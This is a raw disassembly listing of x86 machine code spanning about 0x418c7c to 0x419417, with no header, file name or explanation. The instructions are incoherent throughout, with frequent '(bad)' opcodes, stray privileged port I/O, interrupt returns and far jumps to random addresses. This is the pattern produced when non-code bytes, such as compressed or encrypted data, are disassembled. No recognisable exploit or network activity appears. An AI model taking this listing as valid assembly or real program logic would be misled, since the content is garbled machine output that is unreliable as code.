  418c7c:	mov    cl,0x14
  418c7e:	cdq    
  418c7f:	push   0xf
  418c81:	inc    edx
  418c82:	(bad)  
  418c83:	mov    ah,0x6f
  418c85:	adc    DWORD PTR [ebx+0x4b1da8f5],esi
  418c8b:	iret   
  418c8c:	iret   
  418c8d:	xlat   BYTE PTR ds:[ebx]
  418c8e:	jbe    0x418c19
  418c90:	mov    BYTE PTR [ecx-0x33],cl
  418c93:	adc    DWORD PTR [ebx],ecx
  418c95:	ja     0x418c62
  418c97:	xor    BYTE PTR [esi+0x49],ch
  418c9a:	push   ebp
  418c9b:	pop    ss
  418c9c:	jl     0x418ccb
  418c9e:	out    0xbc,al
  418ca0:	pop    esi
  418ca1:	in     eax,0xa6
  418ca3:	mov    al,0x59
  418ca5:	or     esp,ecx
  418ca7:	lahf   
  418ca8:	adc    dh,ah
  418caa:	pop    es
  418cab:	loope  0x418c50
  418cad:	mov    ds:0xee5640a6,al
  418cb2:	fisubr WORD PTR [edi-0x1ed8fc50]
  418cb8:	xchg   ebx,eax
  418cb9:	imul   ebx,DWORD PTR [eax],0xae5234ff
  418cbf:	int    0x9
  418cc1:	push   ss
  418cc2:	cmp    al,ah
  418cc4:	xor    BYTE PTR [esi-0x50],al
  418cc7:	xchg   ecx,eax
  418cc8:	add    eax,0xac95a54a
  418ccd:	or     ch,bl
  418ccf:	test   eax,0xb3decc07
  418cd4:	sbb    eax,0x5ded4639
  418cd9:	(bad)  
  418cda:	fisttp WORD PTR [edi]
  418cdc:	clc    
  418cdd:	gs enter 0x35bf,0xd0
  418ce2:	in     al,0x6e
  418ce4:	stos   DWORD PTR es:[edi],eax
  418ce5:	xchg   ebx,eax
  418ce6:	jno    0x418d22
  418ce8:	push   ds
  418ce9:	mov    dl,0xb3
  418ceb:	ret    
  418cec:	mov    dl,0x16
  418cee:	jbe    0x418d05
  418cf0:	mov    dl,0x97
  418cf2:	retf   
  418cf3:	nop
  418cf4:	int3   
  418cf5:	cmp    eax,0x8445dfaa
  418cfa:	das    
  418cfb:	jns    0x418d34
  418cfd:	cmp    al,0x76
  418cff:	inc    ecx
  418d00:	retf   
  418d01:	inc    edx
  418d02:	(bad)  
  418d03:	pop    ebp
  418d04:	add    al,0x9d
  418d06:	sbb    al,0xf6
  418d08:	jmp    0xf203905
  418d0d:	sbb    bh,BYTE PTR [edi-0x14f914b9]
  418d13:	ja     0x418ce2
  418d15:	push   ebp
  418d16:	push   edi
  418d17:	mov    esi,0x807a7551
  418d1c:	icebp  
  418d1d:	daa    
  418d1e:	lea    edi,[eax+ebx*8-0x6c]
  418d22:	cmp    BYTE PTR [ebx+0x1d],dh
  418d25:	pop    ds
  418d26:	(bad)  
  418d27:	ja     0x418d55
  418d29:	push   es
  418d2a:	ins    BYTE PTR es:[edi],dx
  418d2b:	test   edi,0x3dabb84b
  418d31:	xor    cl,bh
  418d33:	mov    edi,0xb5f1cb64
  418d38:	sub    BYTE PTR [esi+0xe7fc2ca],dh
  418d3e:	inc    edx
  418d3f:	inc    ebp
  418d40:	pop    esi
  418d41:	out    0x40,al
  418d43:	dec    esi
  418d44:	aas    
  418d45:	cmp    esp,DWORD PTR [eax+0x6ea74a3]
  418d4b:	test   DWORD PTR [eax+edi*8-0x5dbe59c7],edi
  418d52:	inc    esp
  418d53:	scas   eax,DWORD PTR es:[edi]
  418d54:	(bad)  [ecx+0x62]
  418d57:	arpl   si,cx
  418d59:	pusha  
  418d5a:	scas   al,BYTE PTR es:[edi]
  418d5b:	xor    BYTE PTR [edx],0x89
  418d5e:	or     bh,dl
  418d60:	inc    eax
  418d61:	cmp    cl,0x8c
  418d64:	cwde   
  418d65:	push   cs
  418d66:	clc    
  418d67:	in     eax,0x5e
  418d69:	and    BYTE PTR [edi+0x787a4847],0x4f
  418d70:	push   DWORD PTR [esi]
  418d72:	lahf   
  418d73:	adc    dh,al
  418d75:	es dec ebx
  418d77:	pop    ds
  418d78:	and    esp,DWORD PTR [ebx]
  418d7a:	xchg   DWORD PTR gs:[edx-0x2749dc94],edx
  418d81:	xchg   ecx,eax
  418d82:	xor    BYTE PTR [ebp-0x4a],cl
  418d85:	int3   
  418d86:	lods   al,BYTE PTR ds:[esi]
  418d87:	cmp    BYTE PTR [ebp+0x581d37fe],ah
  418d8d:	scas   eax,DWORD PTR es:[edi]
  418d8e:	loope  0x418dba
  418d90:	(bad)  
  418d91:	dec    esp
  418d92:	loop   0x418d9c
  418d94:	sbb    cl,BYTE PTR [esi]
  418d96:	(bad)  
  418d98:	mov    ds:0xcd71094b,al
  418d9d:	xor    al,0xa2
  418d9f:	leave  
  418da0:	iret   
  418da1:	(bad)  
  418da2:	int    0x8d
  418da4:	sub    al,cl
  418da6:	in     eax,0x50
  418da8:	jo     0x418e19
  418daa:	push   ebp
  418dab:	push   eax
  418dac:	aaa    
  418dad:	push   ds
  418dae:	ins    BYTE PTR es:[edi],dx
  418daf:	push   ss
  418db0:	and    DWORD PTR [ebp+ebx*4+0x48c43f3d],0xddf26970
  418dbb:	inc    esp
  418dbc:	or     cl,BYTE PTR [eax+0x668f73cc]
  418dc2:	or     DWORD PTR [ebx-0x5a6633ea],esi
  418dc8:	adc    al,0x89
  418dca:	pop    ds
  418dcb:	adc    eax,0xe985aa1d
  418dd0:	mov    ebp,DWORD PTR ds:[eax]
  418dd3:	adc    ecx,ecx
  418dd5:	icebp  
  418dd6:	les    esp,FWORD PTR [ecx]
  418dd8:	xor    bh,BYTE PTR [ecx+0x6540b305]
  418dde:	xchg   eax,esp
  418de0:	lahf   
  418de1:	jbe    0x418e46
  418de3:	mov    bl,0xf3
  418de5:	imul   eax,DWORD PTR [esi-0x64],0xffffffc4
  418de9:	pop    eax
  418dea:	cli    
  418deb:	jb     0x418dea
  418ded:	dec    ebx
  418dee:	jl     0x418dbd
  418df0:	xchg   ebp,eax
  418df1:	and    ecx,eax
  418df3:	daa    
  418df4:	cwde   
  418df5:	push   ds
  418df6:	aam    0xfe
  418df8:	bound  ebp,QWORD PTR [eax+0x71aadf3f]
  418dfe:	jecxz  0x418dd9
  418e00:	mov    ecx,0x61993694
  418e05:	and    al,0xb5
  418e07:	sbb    ebx,DWORD PTR ss:[eax]
  418e0a:	xor    al,0x36
  418e0c:	sbb    esp,DWORD PTR [edx+eiz*8]
  418e0f:	cmp    al,0x28
  418e11:	sbb    eax,edi
  418e13:	lds    ebp,FWORD PTR [eax+0x24]
  418e16:	(bad)  
  418e18:	sbb    al,0xa5
  418e1a:	test   DWORD PTR [esi-0x6a],edx
  418e1d:	into   
  418e1e:	sti    
  418e1f:	mov    esi,0x1e274f28
  418e24:	loopne 0x418de5
  418e26:	fwait
  418e27:	pop    ebp
  418e28:	adc    DWORD PTR [ecx-0x7d57be3b],edi
  418e2e:	mov    DWORD PTR [edi-0x44],ecx
  418e31:	mov    cl,0x89
  418e33:	xchg   BYTE PTR [edx],dh
  418e35:	xchg   esp,eax
  418e36:	or     ebx,0x0
  418e39:	dec    ecx
  418e3a:	test   BYTE PTR [eax-0x6b],bh
  418e3d:	fistp  WORD PTR [ebx+0x3518d9de]
  418e43:	sbb    ah,al
  418e45:	int    0x43
  418e47:	fwait
  418e48:	push   edi
  418e49:	sbb    al,0x40
  418e4b:	test   dh,0xbe
  418e4e:	(bad)  
  418e4f:	jge    0x418ec0
  418e51:	jecxz  0x418e28
  418e53:	ds cwde 
  418e55:	sub    ah,BYTE PTR [ebx-0x1]
  418e58:	std    
  418e59:	(bad)  
  418e5a:	and    BYTE PTR [eax+0x461b1c28],al
  418e60:	add    al,0x9f
  418e62:	bound  esp,QWORD PTR [esi]
  418e64:	jmp    0x418ede
  418e66:	test   al,0x71
  418e68:	xor    edx,edi
  418e6a:	ja     0x418e93
  418e6c:	lods   al,BYTE PTR ds:[esi]
  418e6d:	fistp  WORD PTR [eax]
  418e6f:	xchg   ebp,eax
  418e70:	mov    eax,0x2fb8335a
  418e75:	in     al,0xcd
  418e77:	dec    edi
  418e78:	mov    edi,0x434b7688
  418e7d:	jns    0x418e62
  418e7f:	add    edx,DWORD PTR [esi-0x4a]
  418e82:	push   ds
  418e83:	sahf   
  418e84:	mov    eax,ds:0x89516a4e
  418e89:	div    DWORD PTR [eax]
  418e8b:	push   esi
  418e8c:	data16 cs out dx,al
  418e8f:	push   es
  418e90:	push   esp
  418e91:	sbb    DWORD PTR [ebx],esi
  418e93:	sbb    ch,BYTE PTR [edx-0x76]
  418e96:	push   ecx
  418e97:	popa   
  418e98:	push   ds
  418e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e9a:	xor    bh,bh
  418e9c:	out    dx,al
  418e9d:	add    al,0xa
  418e9f:	in     eax,0x4a
  418ea1:	(bad)  
  418ea2:	and    DWORD PTR [esi+0x4fb51fc4],esp
  418ea8:	in     al,dx
  418ea9:	lds    ebp,FWORD PTR [edi]
  418eab:	mov    ds,WORD PTR [edx-0x6b7f1057]
  418eb1:	push   eax
  418eb2:	xlat   BYTE PTR ds:[ebx]
  418eb3:	add    ebx,ebx
  418eb5:	jnp    0x418e8a
  418eb7:	dec    esp
  418eb8:	jo     0x418f20
  418eba:	mov    bl,0xc5
  418ebc:	xchg   DWORD PTR [ebp-0x17b20c26],ebx
  418ec2:	sub    ch,bl
  418ec4:	jne    0x418eb4
  418ec6:	iret   
  418ec7:	mov    cl,0x4b
  418ec9:	mov    dh,0x97
  418ecb:	cmp    eax,ebp
  418ecd:	rcr    esi,1
  418ecf:	mov    WORD PTR ds:0xf86ba640,ss
  418ed5:	cwde   
  418ed6:	pop    esp
  418ed7:	ret    0x5d6d
  418eda:	xchg   bh,dl
  418edc:	int3   
  418edd:	call   0xf44b:0x5edf6d15
  418ee4:	outs   dx,DWORD PTR ds:[esi]
  418ee5:	into   
  418ee6:	or     BYTE PTR ds:0xccd5bc7e,bl
  418eec:	inc    esi
  418eed:	test   eax,0x8cff9351
  418ef2:	mov    DWORD PTR [edi+0x3b],ebp
  418ef5:	jnp    0x418f14
  418ef7:	xchg   ebp,eax
  418ef8:	push   ss
  418ef9:	ins    DWORD PTR es:[edi],dx
  418efa:	test   eax,0x22a86b53
  418eff:	sub    DWORD PTR [edx],ebx
  418f01:	xchg   esp,eax
  418f02:	test   eax,0x17ad5883
  418f07:	in     eax,dx
  418f08:	ja     0x418f4f
  418f0a:	call   0x359443a6
  418f0f:	mov    bl,0x14
  418f11:	adc    dl,BYTE PTR [ebp+0x37]
  418f14:	rol    DWORD PTR [edi+0x1c7c19d4],cl
  418f1a:	popf   
  418f1b:	inc    esp
  418f1c:	mov    ds:0x69aa0f12,eax
  418f22:	jle    0x418ee9
  418f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f25:	xchg   ebx,eax
  418f26:	pop    esi
  418f27:	pop    esi
  418f28:	iret   
  418f29:	lds    edx,FWORD PTR [eax]
  418f2b:	(bad)  
  418f2c:	iret   
  418f2d:	dec    edx
  418f2e:	mov    esp,ds
  418f30:	addr16 jnp 0x418ef2
  418f33:	pusha  
  418f34:	lock mov edi,0x627c325c
  418f3a:	lock push ecx
  418f3c:	inc    esi
  418f3d:	xchg   ecx,eax
  418f3e:	jecxz  0x418fa0
  418f40:	add    cl,al
  418f42:	imul   ebp,DWORD PTR [esi-0x62],0x47047883
  418f49:	(bad)  
  418f4a:	inc    eax
  418f4b:	push   ds
  418f4c:	imul   eax,DWORD PTR [edi+0x23],0x3f
  418f50:	ret    0xbbd0
  418f53:	ss dec edi
  418f55:	stos   DWORD PTR es:[edi],eax
  418f56:	rcl    DWORD PTR [eax-0x64],cl
  418f59:	aam    0x3a
  418f5b:	shl    DWORD PTR [ebx-0x46],cl
  418f5e:	(bad)
  418f62:	test   DWORD PTR [edx],esi
  418f64:	dec    eax
  418f65:	mov    dl,0x4b
  418f67:	in     al,dx
  418f68:	ret    0xe774
  418f6b:	popa   
  418f6c:	test   edx,ebp
  418f6e:	es mov al,dl
  418f71:	adc    al,0x2f
  418f73:	dec    eax
  418f74:	push   esi
  418f75:	xlat   BYTE PTR ds:[ebx]
  418f76:	inc    ebp
  418f77:	xchg   DWORD PTR [edx],edi
  418f79:	and    eax,0x174c0de
  418f7e:	lods   eax,DWORD PTR ds:[esi]
  418f7f:	cmp    esi,edx
  418f81:	push   esi
  418f82:	aad    0x13
  418f84:	sub    al,0xc2
  418f86:	sbb    esp,esi
  418f88:	popa   
  418f89:	or     BYTE PTR ds:0xda5bce04,dl
  418f8f:	idiv   DWORD PTR [esi]
  418f91:	out    dx,eax
  418f92:	inc    esp
  418f93:	jb     0x418f55
  418f95:	out    0x64,eax
  418f97:	sti    
  418f98:	cmp    eax,0x98d9c341
  418f9d:	and    eax,0x61d04c52
  418fa2:	sbb    al,0xc9
  418fa4:	aaa    
  418fa5:	mov    ah,0x7e
  418fa7:	inc    ax
  418fa9:	sub    BYTE PTR [ebx],cl
  418fab:	and    cl,bl
  418fad:	shl    BYTE PTR [edi+edi*4],0x2c
  418fb1:	call   0xa965fe30
  418fb6:	hlt    
  418fb7:	add    eax,0xdc451f40
  418fbc:	add    dh,BYTE PTR [ebp+0x72]
  418fbf:	out    dx,al
  418fc0:	pop    esp
  418fc1:	ret    0xd495
  418fc4:	jl     0x418f83
  418fc6:	xor    al,0x91
  418fc8:	iret   
  418fc9:	push   ebp
  418fca:	mov    ebx,DWORD PTR [ebp+0x60]
  418fcd:	adc    ecx,DWORD PTR [edx+0x65]
  418fd0:	dec    edx
  418fd1:	(bad)  
  418fd2:	add    al,0xe4
  418fd4:	push   esp
  418fd5:	xchg   edi,eax
  418fd6:	mov    al,ds:0x5db0be23
  418fdb:	sar    BYTE PTR gs:0xf875ca15,0xec
  418fe3:	or     BYTE PTR [ecx],dh
  418fe5:	imul   edi,DWORD PTR [ebx-0x24],0xd
  418fe9:	out    dx,al
  418fea:	push   0xe63fd173
  418fef:	pop    DWORD PTR fs:[ecx]
  418ff2:	sti    
  418ff3:	mov    ch,0x0
  418ff5:	cmp    esi,DWORD PTR [esi-0x4fe85a4a]
  418ffb:	or     bl,ch
  418ffd:	pop    es
  418ffe:	into   
  418fff:	in     eax,0x4e
  419001:	loope  0x418fdc
  419003:	(bad)  
  419004:	mov    cl,0xeb
  419006:	pop    ecx
  419007:	mov    ebp,0xf4102ba7
  41900c:	or     eax,0x2f4ca20e
  419011:	outs   dx,BYTE PTR ds:[esi]
  419012:	inc    eax
  419013:	and    al,0x84
  419015:	ror    DWORD PTR [ebx+0x382b112a],0xe2
  41901c:	ss cli 
  41901e:	jmp    0xed9a:0x8f942466
  419025:	adc    BYTE PTR [esi],al
  419027:	or     al,0x71
  419029:	(bad)  
  41902a:	add    eax,0xfac40e68
  41902f:	xchg   edx,eax
  419030:	fistp  DWORD PTR [eax+0x29]
  419033:	push   esi
  419034:	adc    ecx,DWORD PTR [eax]
  419036:	outs   dx,BYTE PTR ds:[esi]
  419037:	imul   ecx,DWORD PTR [ebx+0x42],0xb56d1dc2
  41903e:	imul   edi,edx,0x71
  419041:	dec    edx
  419042:	mov    ecx,0xbcef2ab1
  419047:	or     eax,0xe287bb6a
  41904c:	cmp    al,dh
  41904e:	(bad)  
  41904f:	jno    0x419064
  419051:	div    BYTE PTR [esi]
  419053:	dec    edx
  419054:	fdiv   QWORD PTR [eax+0x71af7ea3]
  41905a:	mov    edi,0x5b0930b9
  41905f:	aaa    
  419060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419061:	add    BYTE PTR [esi+0x2360a090],bh
  419067:	fild   QWORD PTR [ebp-0x4742f040]
  41906d:	out    0xef,al
  41906f:	add    eax,0xef01bcc1
  419074:	mov    eax,ds:0xc9423065
  419079:	(bad)  
  41907a:	jmp    0x1f4dc90d
  41907f:	in     eax,0x63
  419081:	std    
  419082:	mov    eax,ds:0x6b2ef463
  419087:	mov    ds:0x4e8dcfc6,eax
  41908c:	mov    WORD PTR [eax+0x6833696e],?
  419092:	push   0x6b0167a3
  419097:	outs   dx,DWORD PTR ds:[esi]
  419098:	icebp  
  419099:	mov    edx,0x67b2c2f3
  41909e:	xor    DWORD PTR [ebx+0x31f724b3],ebp
  4190a4:	fsubr  DWORD PTR [ebx]
  4190a6:	or     BYTE PTR [eax+0x67865845],cl
  4190ac:	in     eax,dx
  4190ad:	and    esi,ebx
  4190af:	dec    BYTE PTR [eax+0x10]
  4190b2:	sbb    bh,bl
  4190b4:	mov    gs,WORD PTR [esi+edx*2]
  4190b7:	shl    BYTE PTR [ebp-0x2faa7f7],cl
  4190bd:	neg    BYTE PTR [edx-0x25b43182]
  4190c3:	jbe    0x4190f9
  4190c5:	adc    eax,esi
  4190c7:	dec    edx
  4190c8:	jo     0x419065
  4190ca:	xchg   ebp,eax
  4190cb:	push   ebx
  4190cc:	sahf   
  4190cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190ce:	dec    esi
  4190cf:	jae    0x41906b
  4190d1:	test   al,0xd
  4190d3:	add    eax,0xdf085372
  4190d8:	in     al,0x81
  4190da:	not    al
  4190dc:	cmc    
  4190dd:	push   ebx
  4190de:	pushf  
  4190df:	stos   DWORD PTR es:[edi],eax
  4190e0:	push   edx
  4190e1:	xlat   BYTE PTR ds:[ebx]
  4190e2:	sahf   
  4190e3:	sbb    al,0x10
  4190e5:	test   BYTE PTR [ecx-0x7154b4fb],dl
  4190eb:	mov    ebx,0xbefd0e09
  4190f0:	std    
  4190f1:	mov    DWORD PTR ds:0xf3ce5e52,ebp
  4190f7:	xor    DWORD PTR [ebx],edx
  4190f9:	(bad)  
  4190fa:	ja     0x41907e
  4190fc:	sar    DWORD PTR [ebp+0x379e206b],cl
  419102:	and    DWORD PTR [edx-0x4],eax
  419105:	out    dx,al
  419106:	mov    BYTE PTR [ebp+0x66],ah
  419109:	xor    al,0xb5
  41910b:	push   es
  41910c:	xor    BYTE PTR [edi+0x43],cl
  41910f:	and    BYTE PTR [esi],0xb3
  419112:	fldpi  
  419114:	jecxz  0x419156
  419116:	add    ecx,esp
  419118:	ja     0x419102
  41911a:	push   eax
  41911b:	dec    eax
  41911c:	mov    esi,0x8e985b5f
  419121:	adc    al,BYTE PTR [eax+ebx*1]
  419124:	mov    ah,0x20
  419126:	dec    eax
  419127:	(bad)  
  419128:	les    esi,FWORD PTR [edx-0x5a7a735d]
  41912e:	cld    
  41912f:	clc    
  419130:	scas   al,BYTE PTR es:[edi]
  419131:	(bad)  [eax+0x8]
  419134:	inc    esi
  419135:	jmp    0x41910b
  419137:	xchg   esp,eax
  419138:	jmp    0x419102
  41913a:	mov    dl,0x84
  41913c:	imul   ecx,DWORD PTR [edx-0x5f726229],0xe068adb0
  419146:	int3   
  419147:	mov    dh,0x12
  419149:	(bad)  
  41914b:	pop    ecx
  41914c:	and    al,0x58
  41914e:	xchg   DWORD PTR [edi-0x17f53352],esp
  419154:	mov    edi,DWORD PTR [esi+edi*8+0x24]
  419158:	ja     0x419121
  41915a:	mov    ebx,0x19f8ab9e
  41915f:	pop    es
  419160:	xabort 0x93
  419163:	scas   al,BYTE PTR es:[edi]
  419164:	mov    bl,bh
  419166:	adc    DWORD PTR [ebp+0x35df34a0],eax
  41916c:	sbb    DWORD PTR [edi],ebp
  41916e:	ret    0x25ae
  419171:	jle    0x4191d6
  419173:	test   eax,0x36c3bc65
  419178:	lods   al,BYTE PTR ds:[esi]
  419179:	in     eax,0xec
  41917b:	push   eax
  41917c:	aas    
  41917d:	and    DWORD PTR [ecx-0x3d],0x8cfba124
  419184:	xchg   ebp,eax
  419185:	outs   dx,DWORD PTR ds:[esi]
  419186:	repz jne 0x419204
  419189:	jmp    0xfb92eca6
  41918e:	xlat   BYTE PTR ds:[ebx]
  41918f:	outs   dx,BYTE PTR ds:[esi]
  419190:	js     0x4191cb
  419192:	pop    es
  419193:	mov    ds:0xe86d61d7,al
  419198:	data16 mov bh,0x57
  41919b:	cmp    DWORD PTR [esi-0x15],0x6b
  41919f:	imul   edi,DWORD PTR [edi+ebp*2-0x2cb798d7],0x0
  4191a7:	mov    esi,0x826be06d
  4191ac:	iret   
  4191ad:	sub    BYTE PTR [edi],ch
  4191af:	test   DWORD PTR [edi-0x76],eax
  4191b2:	in     eax,0xa4
  4191b4:	and    ebp,esi
  4191b6:	out    0x27,eax
  4191b8:	sub    ah,ch
  4191ba:	sub    eax,0x4bb5d539
  4191bf:	mov    dl,0xc1
  4191c1:	cmp    al,BYTE PTR [ebp+0x26d440ef]
  4191c7:	inc    edx
  4191c8:	fcom   QWORD PTR [ebx]
  4191ca:	(bad)  
  4191cb:	and    dl,BYTE PTR [esi-0x3281d211]
  4191d1:	mov    cl,0x32
  4191d3:	ret    
  4191d4:	mov    ebp,0xf19af78c
  4191d9:	push   ss
  4191da:	and    ebp,DWORD PTR [ecx]
  4191dc:	frstor [edi]
  4191de:	fmul   DWORD PTR [ebx+0xc]
  4191e1:	pop    ebp
  4191e2:	push   es
  4191e3:	mov    cl,0x77
  4191e5:	mov    dl,0x30
  4191e7:	jmp    0x98ee:0x7b5bb068
  4191ee:	sub    al,0x23
  4191f0:	out    dx,al
  4191f1:	dec    eax
  4191f2:	retf   
  4191f3:	out    dx,al
  4191f4:	mov    esi,0xdc9523f4
  4191f9:	inc    esi
  4191fa:	and    BYTE PTR [ebx],bl
  4191fc:	jmp    0x4191a5
  4191fe:	mov    esp,0x5ad9d8c
  419203:	out    0x48,eax
  419205:	sub    al,0xa5
  419207:	outs   dx,DWORD PTR ds:[esi]
  419208:	push   eax
  419209:	pop    ebp
  41920a:	dec    eax
  41920b:	jno    0x41926b
  41920d:	sbb    eax,0xd03a03b2
  419212:	ins    DWORD PTR es:[edi],dx
  419213:	sub    ebx,esp
  419215:	cmp    edi,DWORD PTR ds:0xb689eb1b
  41921b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41921c:	xchg   ebp,eax
  41921d:	jmp    0xb5e29a71
  419222:	jmp    0xb813:0x5a4e56d0
  419229:	das    
  41922a:	pushf  
  41922b:	and    DWORD PTR [eax],ecx
  41922d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41922e:	sbb    dl,BYTE PTR [eax+ecx*4]
  419231:	mov    cl,0xe4
  419233:	pop    ebp
  419234:	ds stc 
  419236:	adc    al,0x72
  419238:	out    0x3b,al
  41923a:	pop    edx
  41923b:	push   eax
  41923c:	xchg   edi,eax
  41923d:	scas   eax,DWORD PTR es:[edi]
  41923e:	cmp    BYTE PTR [eax+ebx*8-0x74],bl
  419242:	mov    eax,ds:0x12dbacda
  419247:	pop    edx
  419248:	push   es
  419249:	out    0x1e,al
  41924b:	mov    ch,0xc2
  41924d:	ja     0x419216
  41924f:	sbb    ecx,DWORD PTR [edi+0x8]
  419252:	in     al,dx
  419253:	sahf   
  419254:	loope  0x419236
  419256:	leave  
  419257:	pushf  
  419258:	pop    ss
  419259:	out    dx,al
  41925a:	mov    eax,ds:0xd9922507
  41925f:	adc    BYTE PTR [edi],bl
  419261:	pop    ebp
  419262:	dec    edi
  419263:	std    
  419264:	and    BYTE PTR [ebx],bh
  419266:	(bad)  
  419267:	cmp    DWORD PTR [ebp-0x2e],ecx
  41926a:	fwait
  41926b:	leave  
  41926c:	shl    esp,1
  41926e:	outs   dx,DWORD PTR ds:[esi]
  41926f:	out    0xf4,eax
  419271:	clc    
  419272:	repnz cs stos BYTE PTR es:[edi],al
  419275:	pop    edx
  419276:	js     0x419296
  419278:	mov    ebp,0xd4892692
  41927d:	pusha  
  41927e:	into   
  41927f:	test   DWORD PTR [ebp-0x587a0038],eax
  419285:	sub    esi,DWORD PTR [ebp-0xb]
  419288:	add    bl,BYTE PTR [edx-0x75]
  41928b:	inc    esp
  41928c:	push   ebx
  41928d:	and    eax,0xdd3f534d
  419292:	(bad)  
  419293:	push   0x4bbdfd86
  419298:	sahf   
  419299:	ds (bad) 
  41929b:	sub    ebp,DWORD PTR [eax+0x7]
  41929e:	xchg   ebp,eax
  41929f:	shl    DWORD PTR [ecx-0x19eb18de],1
  4192a5:	mov    ds:0x138f8ff2,eax
  4192aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192ab:	pop    es
  4192ac:	or     BYTE PTR [ebp+edi*8-0x6],ch
  4192b0:	ja     0x419299
  4192b2:	xor    al,0x10
  4192b4:	sbb    ah,BYTE PTR [edx]
  4192b6:	pop    ds
  4192b7:	loop   0x41926d
  4192b9:	push   ebp
  4192ba:	iret   
  4192bb:	pop    edx
  4192bc:	or     ebp,0x8066573
  4192c2:	sub    DWORD PTR [ebp-0x4762eba1],esp
  4192c8:	add    BYTE PTR gs:[eax+0x7],al
  4192cc:	inc    ebx
  4192cd:	mov    dl,0x3c
  4192cf:	mov    ds:0xe0d88aee,al
  4192d4:	or     al,BYTE PTR [edi+0x7e]
  4192d7:	stos   BYTE PTR es:[edi],al
  4192d8:	pusha  
  4192d9:	add    dl,al
  4192db:	dec    ebx
  4192dc:	mov    cl,0xd3
  4192de:	ja     0x41927f
  4192e0:	dec    esp
  4192e1:	push   cs
  4192e2:	sbb    bl,BYTE PTR [ebp+0x2]
  4192e5:	xor    eax,ecx
  4192e7:	je     0x4192e8
  4192e9:	adc    edi,DWORD PTR [bp-0x52]
  4192ed:	inc    edx
  4192ee:	push   ss
  4192ef:	sti    
  4192f0:	and    al,BYTE PTR [edi-0x5b]
  4192f3:	sbb    BYTE PTR [ebx-0x30],bh
  4192f6:	sub    al,0x79
  4192f8:	lock stos BYTE PTR es:[edi],al
  4192fa:	stc    
  4192fb:	mov    ecx,0xf70d4a7f
  419300:	push   esp
  419301:	mov    dh,0x64
  419303:	mov    ?,WORD PTR [eax]
  419305:	pushf  
  419306:	mov    cl,0xb7
  419308:	lods   al,BYTE PTR ds:[esi]
  419309:	mov    dh,0x4e
  41930b:	sbb    DWORD PTR [edi],esp
  41930d:	rcl    DWORD PTR [ecx],1
  41930f:	pop    ebx
  419310:	dec    ebx
  419311:	ins    DWORD PTR es:[edi],dx
  419312:	sub    al,0xa2
  419314:	mov    ax,0xe7ac
  419318:	and    ecx,DWORD PTR [edi+0x34]
  41931b:	mov    dh,0x28
  41931d:	inc    edx
  41931e:	std    
  41931f:	xchg   edx,eax
  419320:	adc    al,0xf2
  419322:	push   edi
  419323:	call   0x5ab95df2
  419328:	cmp    eax,0x3f79e0c2
  41932d:	fwait
  41932e:	cs jo  0x4192b1
  419331:	pop    esi
  419332:	inc    ebx
  419333:	add    esp,DWORD PTR [ebp-0x18add05e]
  419339:	mov    eax,0x3a2d064
  41933e:	xor    eax,0x564caeb2
  419343:	add    ah,dh
  419345:	bound  edi,QWORD PTR [edx-0x57]
  419348:	jns    0x419398
  41934a:	sub    bl,0xce
  41934d:	or     ah,BYTE PTR [edi+0x6ed93c54]
  419353:	or     al,0xb9
  419355:	sbb    BYTE PTR [esp+esi*2],ah
  419358:	cmp    dl,al
  41935a:	pusha  
  41935b:	jl     0x419338
  41935d:	pop    ss
  41935e:	test   al,0x2f
  419360:	icebp  
  419361:	sar    dl,0xf
  419364:	std    
  419365:	pop    ds
  419366:	push   edx
  419367:	mov    esp,0x80489451
  41936c:	sti    
  41936d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41936e:	in     al,dx
  41936f:	push   edx
  419370:	and    BYTE PTR [ecx-0x2a],bl
  419373:	or     al,0x82
  419375:	push   edi
  419376:	mov    bh,0x99
  419378:	test   eax,0x6bd29f32
  41937d:	sub    DWORD PTR [edx-0x21813d65],0xec4e5c81
  419387:	mov    bl,0x28
  419389:	xchg   ebp,eax
  41938a:	inc    esi
  41938b:	inc    esp
  41938c:	jno    0x419379
  41938e:	mov    edx,0x4b55d74c
  419393:	mov    esi,0xc5a15c07
  419398:	fst    QWORD PTR [ebx+esi*4+0x2a46bdb6]
  41939f:	(bad)  
  4193a0:	test   BYTE PTR [edx],0x51
  4193a3:	xchg   edx,eax
  4193a4:	ret    0x82b7
  4193a7:	mov    ebp,0x9db3c56f
  4193ac:	stos   BYTE PTR es:[edi],al
  4193ad:	push   ebp
  4193ae:	(bad)  
  4193af:	pop    edi
  4193b0:	(bad)  
  4193b1:	push   ebx
  4193b2:	jge    0x41934a
  4193b4:	lahf   
  4193b5:	(bad)  
  4193b6:	adc    esp,DWORD PTR [edx]
  4193b8:	sbb    eax,0xcf392436
  4193bd:	and    ecx,DWORD PTR ss:[ecx]
  4193c0:	jge    0x4193fe
  4193c2:	push   esi
  4193c3:	jne    0x419416
  4193c5:	add    dh,al
  4193c7:	(bad)  [esi-0x3654f094]
  4193cd:	or     DWORD PTR [edx+0x1b],ebp
  4193d0:	adc    DWORD PTR [edi],esi
  4193d2:	ret    0x2903
  4193d5:	iret   
  4193d6:	js     0x4193a9
  4193d8:	(bad)  
  4193da:	cwde   
  4193db:	inc    esp
  4193dc:	in     al,0x40
  4193de:	cmp    DWORD PTR [ecx-0x7b],ebx
  4193e1:	or     esp,edi
  4193e3:	mov    ss,WORD PTR [eax]
  4193e5:	mov    esi,eax
  4193e7:	adc    cl,BYTE PTR [eax+0x3e]
  4193ea:	stos   BYTE PTR es:[edi],al
  4193eb:	jne    0x419382
  4193ed:	cli    
  4193ee:	imul   edx,DWORD PTR [edx-0x26],0xffffffdb
  4193f2:	sub    esi,ebp
  4193f4:	cld    
  4193f5:	inc    edi
  4193f6:	lods   eax,DWORD PTR ds:[esi]
  4193f7:	js     0x4193bc
  4193f9:	(bad)  [ebx-0x100a580]
  4193ff:	or     dh,bl
  419401:	push   esp
  419402:	data16 jne 0x419404
  419405:	and    eax,0xfcd01e43
  41940a:	repnz shr dl,1
  41940d:	jo     0x4193a3
  41940f:	adc    BYTE PTR [edx+ebp*1+0x5fe59f84],0xfc
  419417:	cmc    
